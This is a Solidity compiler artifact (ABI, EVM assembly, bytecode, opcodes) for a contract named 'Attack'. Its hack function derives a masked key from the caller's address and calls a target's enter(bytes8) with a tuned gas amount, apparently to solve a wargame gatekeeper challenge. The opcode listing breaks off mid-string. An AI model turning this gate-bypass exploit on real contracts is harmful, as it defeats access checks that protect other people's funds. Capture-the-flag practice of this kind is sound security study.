{
	"test6.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract IReentrance",
							"name": "_target",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "gas",
							"type": "uint256"
						}
					],
					"name": "hack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"test6.sol\":137:585  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"test6.sol\":187:255  constructor(IReentrance _target) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"test6.sol\":240:247  _target */\n  dup1\n    /* \"test6.sol\":231:237  target */\n  0x00\n  0x00\n    /* \"test6.sol\":231:247  target = _target */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"test6.sol\":187:255  constructor(IReentrance _target) {... */\n  pop\n    /* \"test6.sol\":137:585  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:681   */\ntag_12:\n    /* \"#utility.yul\":622:629   */\n  0x00\n    /* \"#utility.yul\":651:675   */\n  tag_23\n    /* \"#utility.yul\":669:674   */\n  dup3\n    /* \"#utility.yul\":651:675   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":640:675   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:681   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":687:843   */\ntag_13:\n    /* \"#utility.yul\":777:818   */\n  tag_25\n    /* \"#utility.yul\":812:817   */\n  dup2\n    /* \"#utility.yul\":777:818   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":770:775   */\n  dup2\n    /* \"#utility.yul\":767:819   */\n  eq\n    /* \"#utility.yul\":757:837   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":833:834   */\n  0x00\n    /* \"#utility.yul\":830:831   */\n  0x00\n    /* \"#utility.yul\":823:835   */\n  revert\n    /* \"#utility.yul\":757:837   */\ntag_26:\n    /* \"#utility.yul\":687:843   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":849:1026   */\ntag_14:\n    /* \"#utility.yul\":923:928   */\n  0x00\n    /* \"#utility.yul\":954:960   */\n  dup2\n    /* \"#utility.yul\":948:961   */\n  mload\n    /* \"#utility.yul\":939:961   */\n  swap1\n  pop\n    /* \"#utility.yul\":970:1020   */\n  tag_28\n    /* \"#utility.yul\":1014:1019   */\n  dup2\n    /* \"#utility.yul\":970:1020   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":849:1026   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1032:1417   */\ntag_3:\n    /* \"#utility.yul\":1119:1125   */\n  0x00\n    /* \"#utility.yul\":1168:1170   */\n  0x20\n    /* \"#utility.yul\":1156:1165   */\n  dup3\n    /* \"#utility.yul\":1147:1154   */\n  dup5\n    /* \"#utility.yul\":1143:1166   */\n  sub\n    /* \"#utility.yul\":1139:1171   */\n  slt\n    /* \"#utility.yul\":1136:1255   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1174:1253   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1136:1255   */\ntag_30:\n    /* \"#utility.yul\":1294:1295   */\n  0x00\n    /* \"#utility.yul\":1319:1400   */\n  tag_32\n    /* \"#utility.yul\":1392:1399   */\n  dup5\n    /* \"#utility.yul\":1383:1389   */\n  dup3\n    /* \"#utility.yul\":1372:1381   */\n  dup6\n    /* \"#utility.yul\":1368:1390   */\n  add\n    /* \"#utility.yul\":1319:1400   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1309:1400   */\n  swap2\n  pop\n    /* \"#utility.yul\":1265:1410   */\n  pop\n    /* \"#utility.yul\":1032:1417   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"test6.sol\":137:585  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"test6.sol\":137:585  contract Attack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x25565cdd\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"test6.sol\":263:582  function hack(uint256 gas) external {... */\n    tag_3:\n      tag_4\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_5\n      swap2\n      swap1\n      tag_6\n      jump\t// in\n    tag_5:\n      tag_7\n      jump\t// in\n    tag_4:\n      stop\n    tag_7:\n        /* \"test6.sol\":310:324  uint64 uintKey */\n      0x00\n        /* \"test6.sol\":350:360  msg.sender */\n      caller\n        /* \"test6.sol\":310:363  uint64 uintKey = uint64(uint160(address(msg.sender))) */\n      swap1\n      pop\n        /* \"test6.sol\":374:384  bytes8 key */\n      0x00\n        /* \"test6.sol\":405:423  0xFFFFFFFF0000FFFF */\n      0xffffffff0000ffff\n        /* \"test6.sol\":387:423  bytes8(uintKey) & 0xFFFFFFFF0000FFFF */\n      0xc0\n      shl\n        /* \"test6.sol\":394:401  uintKey */\n      dup3\n        /* \"test6.sol\":387:402  bytes8(uintKey) */\n      0xc0\n      shl\n        /* \"test6.sol\":387:423  bytes8(uintKey) & 0xFFFFFFFF0000FFFF */\n      and\n        /* \"test6.sol\":374:423  bytes8 key = bytes8(uintKey) & 0xFFFFFFFF0000FFFF */\n      swap1\n      pop\n        /* \"test6.sol\":437:446  bool sent */\n      0x00\n        /* \"test6.sol\":459:465  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"test6.sol\":451:471  address(target).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"test6.sol\":477:480  gas */\n      dup5\n        /* \"test6.sol\":523:526  key */\n      dup4\n        /* \"test6.sol\":482:527  abi.encodeWithSignature(\"enter(bytes8)\", key) */\n      add(0x24, mload(0x40))\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x3370204e00000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"test6.sol\":451:528  address(target).call{gas: gas}(abi.encodeWithSignature(\"enter(bytes8)\", key)) */\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup8\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_15\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_14)\n    tag_15:\n      0x60\n      swap2\n      pop\n    tag_14:\n      pop\n        /* \"test6.sol\":436:528  (bool sent,) = address(target).call{gas: gas}(abi.encodeWithSignature(\"enter(bytes8)\", key)) */\n      pop\n      swap1\n      pop\n        /* \"test6.sol\":547:551  sent */\n      dup1\n        /* \"test6.sol\":539:574  require(sent, \"Transaction failed\") */\n      tag_16\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_17\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_16:\n        /* \"test6.sol\":299:582  {... */\n      pop\n      pop\n      pop\n        /* \"test6.sol\":263:582  function hack(uint256 gas) external {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_20:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_22:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_23:\n        /* \"#utility.yul\":490:514   */\n      tag_40\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_22\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_41\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      0x00\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_41:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_24:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_43\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_23\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:1019   */\n    tag_6:\n        /* \"#utility.yul\":749:755   */\n      0x00\n        /* \"#utility.yul\":798:800   */\n      0x20\n        /* \"#utility.yul\":786:795   */\n      dup3\n        /* \"#utility.yul\":777:784   */\n      dup5\n        /* \"#utility.yul\":773:796   */\n      sub\n        /* \"#utility.yul\":769:801   */\n      slt\n        /* \"#utility.yul\":766:885   */\n      iszero\n      tag_45\n      jumpi\n        /* \"#utility.yul\":804:883   */\n      tag_46\n      tag_20\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":766:885   */\n    tag_45:\n        /* \"#utility.yul\":924:925   */\n      0x00\n        /* \"#utility.yul\":949:1002   */\n      tag_47\n        /* \"#utility.yul\":994:1001   */\n      dup5\n        /* \"#utility.yul\":985:991   */\n      dup3\n        /* \"#utility.yul\":974:983   */\n      dup6\n        /* \"#utility.yul\":970:992   */\n      add\n        /* \"#utility.yul\":949:1002   */\n      tag_24\n      jump\t// in\n    tag_47:\n        /* \"#utility.yul\":939:1002   */\n      swap2\n      pop\n        /* \"#utility.yul\":895:1012   */\n      pop\n        /* \"#utility.yul\":690:1019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1025:1174   */\n    tag_25:\n        /* \"#utility.yul\":1061:1068   */\n      0x00\n        /* \"#utility.yul\":1101:1167   */\n      0xffffffffffffffff000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1094:1099   */\n      dup3\n        /* \"#utility.yul\":1090:1168   */\n      and\n        /* \"#utility.yul\":1079:1168   */\n      swap1\n      pop\n        /* \"#utility.yul\":1025:1174   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1180:1295   */\n    tag_26:\n        /* \"#utility.yul\":1265:1288   */\n      tag_50\n        /* \"#utility.yul\":1282:1287   */\n      dup2\n        /* \"#utility.yul\":1265:1288   */\n      tag_25\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1260:1263   */\n      dup3\n        /* \"#utility.yul\":1253:1289   */\n      mstore\n        /* \"#utility.yul\":1180:1295   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1301:1519   */\n    tag_10:\n        /* \"#utility.yul\":1392:1396   */\n      0x00\n        /* \"#utility.yul\":1430:1432   */\n      0x20\n        /* \"#utility.yul\":1419:1428   */\n      dup3\n        /* \"#utility.yul\":1415:1433   */\n      add\n        /* \"#utility.yul\":1407:1433   */\n      swap1\n      pop\n        /* \"#utility.yul\":1443:1512   */\n      tag_52\n        /* \"#utility.yul\":1509:1510   */\n      0x00\n        /* \"#utility.yul\":1498:1507   */\n      dup4\n        /* \"#utility.yul\":1494:1511   */\n      add\n        /* \"#utility.yul\":1485:1491   */\n      dup5\n        /* \"#utility.yul\":1443:1512   */\n      tag_26\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1301:1519   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1525:1623   */\n    tag_27:\n        /* \"#utility.yul\":1576:1582   */\n      0x00\n        /* \"#utility.yul\":1610:1615   */\n      dup2\n        /* \"#utility.yul\":1604:1616   */\n      mload\n        /* \"#utility.yul\":1594:1616   */\n      swap1\n      pop\n        /* \"#utility.yul\":1525:1623   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1629:1776   */\n    tag_28:\n        /* \"#utility.yul\":1730:1741   */\n      0x00\n        /* \"#utility.yul\":1767:1770   */\n      dup2\n        /* \"#utility.yul\":1752:1770   */\n      swap1\n      pop\n        /* \"#utility.yul\":1629:1776   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1782:1921   */\n    tag_29:\n        /* \"#utility.yul\":1871:1877   */\n      dup3\n        /* \"#utility.yul\":1866:1869   */\n      dup2\n        /* \"#utility.yul\":1861:1864   */\n      dup4\n        /* \"#utility.yul\":1855:1878   */\n      mcopy\n        /* \"#utility.yul\":1912:1913   */\n      0x00\n        /* \"#utility.yul\":1903:1909   */\n      dup4\n        /* \"#utility.yul\":1898:1901   */\n      dup4\n        /* \"#utility.yul\":1894:1910   */\n      add\n        /* \"#utility.yul\":1887:1914   */\n      mstore\n        /* \"#utility.yul\":1782:1921   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1927:2313   */\n    tag_30:\n        /* \"#utility.yul\":2031:2034   */\n      0x00\n        /* \"#utility.yul\":2059:2097   */\n      tag_57\n        /* \"#utility.yul\":2091:2096   */\n      dup3\n        /* \"#utility.yul\":2059:2097   */\n      tag_27\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":2113:2201   */\n      tag_58\n        /* \"#utility.yul\":2194:2200   */\n      dup2\n        /* \"#utility.yul\":2189:2192   */\n      dup6\n        /* \"#utility.yul\":2113:2201   */\n      tag_28\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":2106:2201   */\n      swap4\n      pop\n        /* \"#utility.yul\":2210:2275   */\n      tag_59\n        /* \"#utility.yul\":2268:2274   */\n      dup2\n        /* \"#utility.yul\":2263:2266   */\n      dup6\n        /* \"#utility.yul\":2256:2260   */\n      0x20\n        /* \"#utility.yul\":2249:2254   */\n      dup7\n        /* \"#utility.yul\":2245:2261   */\n      add\n        /* \"#utility.yul\":2210:2275   */\n      tag_29\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":2300:2306   */\n      dup1\n        /* \"#utility.yul\":2295:2298   */\n      dup5\n        /* \"#utility.yul\":2291:2307   */\n      add\n        /* \"#utility.yul\":2284:2307   */\n      swap2\n      pop\n        /* \"#utility.yul\":2035:2313   */\n      pop\n        /* \"#utility.yul\":1927:2313   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2319:2590   */\n    tag_12:\n        /* \"#utility.yul\":2449:2452   */\n      0x00\n        /* \"#utility.yul\":2471:2564   */\n      tag_61\n        /* \"#utility.yul\":2560:2563   */\n      dup3\n        /* \"#utility.yul\":2551:2557   */\n      dup5\n        /* \"#utility.yul\":2471:2564   */\n      tag_30\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":2464:2564   */\n      swap2\n      pop\n        /* \"#utility.yul\":2581:2584   */\n      dup2\n        /* \"#utility.yul\":2574:2584   */\n      swap1\n      pop\n        /* \"#utility.yul\":2319:2590   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2596:2765   */\n    tag_31:\n        /* \"#utility.yul\":2680:2691   */\n      0x00\n        /* \"#utility.yul\":2714:2720   */\n      dup3\n        /* \"#utility.yul\":2709:2712   */\n      dup3\n        /* \"#utility.yul\":2702:2721   */\n      mstore\n        /* \"#utility.yul\":2754:2758   */\n      0x20\n        /* \"#utility.yul\":2749:2752   */\n      dup3\n        /* \"#utility.yul\":2745:2759   */\n      add\n        /* \"#utility.yul\":2730:2759   */\n      swap1\n      pop\n        /* \"#utility.yul\":2596:2765   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2771:2939   */\n    tag_32:\n        /* \"#utility.yul\":2911:2931   */\n      0x5472616e73616374696f6e206661696c65640000000000000000000000000000\n        /* \"#utility.yul\":2907:2908   */\n      0x00\n        /* \"#utility.yul\":2899:2905   */\n      dup3\n        /* \"#utility.yul\":2895:2909   */\n      add\n        /* \"#utility.yul\":2888:2932   */\n      mstore\n        /* \"#utility.yul\":2771:2939   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2945:3311   */\n    tag_33:\n        /* \"#utility.yul\":3087:3090   */\n      0x00\n        /* \"#utility.yul\":3108:3175   */\n      tag_65\n        /* \"#utility.yul\":3172:3174   */\n      0x12\n        /* \"#utility.yul\":3167:3170   */\n      dup4\n        /* \"#utility.yul\":3108:3175   */\n      tag_31\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":3101:3175   */\n      swap2\n      pop\n        /* \"#utility.yul\":3184:3277   */\n      tag_66\n        /* \"#utility.yul\":3273:3276   */\n      dup3\n        /* \"#utility.yul\":3184:3277   */\n      tag_32\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":3302:3304   */\n      0x20\n        /* \"#utility.yul\":3297:3300   */\n      dup3\n        /* \"#utility.yul\":3293:3305   */\n      add\n        /* \"#utility.yul\":3286:3305   */\n      swap1\n      pop\n        /* \"#utility.yul\":2945:3311   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3317:3736   */\n    tag_18:\n        /* \"#utility.yul\":3483:3487   */\n      0x00\n        /* \"#utility.yul\":3521:3523   */\n      0x20\n        /* \"#utility.yul\":3510:3519   */\n      dup3\n        /* \"#utility.yul\":3506:3524   */\n      add\n        /* \"#utility.yul\":3498:3524   */\n      swap1\n      pop\n        /* \"#utility.yul\":3570:3579   */\n      dup2\n        /* \"#utility.yul\":3564:3568   */\n      dup2\n        /* \"#utility.yul\":3560:3580   */\n      sub\n        /* \"#utility.yul\":3556:3557   */\n      0x00\n        /* \"#utility.yul\":3545:3554   */\n      dup4\n        /* \"#utility.yul\":3541:3558   */\n      add\n        /* \"#utility.yul\":3534:3581   */\n      mstore\n        /* \"#utility.yul\":3598:3729   */\n      tag_68\n        /* \"#utility.yul\":3724:3728   */\n      dup2\n        /* \"#utility.yul\":3598:3729   */\n      tag_33\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":3590:3729   */\n      swap1\n      pop\n        /* \"#utility.yul\":3317:3736   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220154c6d19cd8a9d46f07ff57ceb27c160bef683a10e009ab6279cda403736fe2464736f6c634300081d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b506040516104a63803806104a6833981810160405281019061003191906100e5565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f5ffd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b6103898061011d5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c806325565cdd1461002d575b5f5ffd5b610047600480360381019061004291906101f5565b610049565b005b5f3390505f67ffffffff0000ffff60c01b8260c01b1690505f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1684836040516024016100ab919061025a565b6040516020818303038152906040527f3370204e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161013591906102c5565b5f604051808303815f8787f1925050503d805f811461016f576040519150601f19603f3d011682016040523d82523d5f602084013e610174565b606091505b50509050806101b8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101af90610335565b60405180910390fd5b50505050565b5f5ffd5b5f819050919050565b6101d4816101c2565b81146101de575f5ffd5b50565b5f813590506101ef816101cb565b92915050565b5f6020828403121561020a576102096101be565b5b5f610217848285016101e1565b91505092915050565b5f7fffffffffffffffff00000000000000000000000000000000000000000000000082169050919050565b61025481610220565b82525050565b5f60208201905061026d5f83018461024b565b92915050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f61029f82610273565b6102a9818561027d565b93506102b9818560208601610287565b80840191505092915050565b5f6102d08284610295565b915081905092915050565b5f82825260208201905092915050565b7f5472616e73616374696f6e206661696c656400000000000000000000000000005f82015250565b5f61031f6012836102db565b915061032a826102eb565b602082019050919050565b5f6020820190508181035f83015261034c81610313565b905091905056fea2646970667358221220154c6d19cd8a9d46f07ff57ceb27c160bef683a10e009ab6279cda403736fe2464736f6c634300081d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4A6 CODESIZE SUB DUP1 PUSH2 0x4A6 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xE5 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x110 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB4 DUP3 PUSH2 0x99 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC4 DUP2 PUSH2 0xAA JUMP JUMPDEST DUP2 EQ PUSH2 0xCE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xDF DUP2 PUSH2 0xBB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFA JUMPI PUSH2 0xF9 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x107 DUP5 DUP3 DUP6 ADD PUSH2 0xD1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x389 DUP1 PUSH2 0x11D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x25565CDD EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x1F5 JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST PUSH0 CALLER SWAP1 POP PUSH0 PUSH8 0xFFFFFFFF0000FFFF PUSH1 0xC0 SHL DUP3 PUSH1 0xC0 SHL AND SWAP1 POP PUSH0 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 DUP4 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0xAB SWAP2 SWAP1 PUSH2 0x25A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x3370204E00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x135 SWAP2 SWAP1 PUSH2 0x2C5 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH0 DUP2 EQ PUSH2 0x16F JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x174 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x1B8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1AF SWAP1 PUSH2 0x335 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1D4 DUP2 PUSH2 0x1C2 JUMP JUMPDEST DUP2 EQ PUSH2 0x1DE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 